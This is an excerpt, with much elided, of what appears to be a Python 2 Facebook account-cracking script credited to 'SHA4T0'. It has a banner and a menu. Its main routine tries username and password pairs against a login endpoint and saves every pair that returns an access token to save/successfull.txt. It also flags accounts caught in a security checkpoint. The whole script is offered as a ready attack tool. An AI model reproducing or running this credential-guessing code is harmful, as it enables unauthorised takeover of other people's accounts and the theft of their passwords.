...
logo = '\n| ________  ___  ___  ________  ___   ___  _________  ________     
|\   ____\|\  \|\  \|\   __  \|\  \ |\  \|\___   ___\\   __  \    
\ \  \___|\ \  \\\  \ \  \|\  \ \  \\_\  \|___ \  \_\ \  \|\  \   
 \ \_____  \ \   __  \ \   __  \ \______  \   \ \  \ \ \  \\\  \  
  \|____|\  \ \  \ \  \ \  \ \  \|_____|\  \   \ \  \ \ \  \\\  \ 
...
id = []
print 'AUTHOR : SHA4T0'
print 'FACEBOOK : Md Shakibur Rahman'
print 'GITHUB : SHA4T0'
print 'GROUP : CCT'
...
def menu():
    ...
    jalan('\x1b[1;90m[9] TO CONTACT SHA4T0')
    print
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHA4T0]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[SHA4T0] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [after 09 days]\n'
    ...
    os.system('python2 SHA4T0V4U.py')
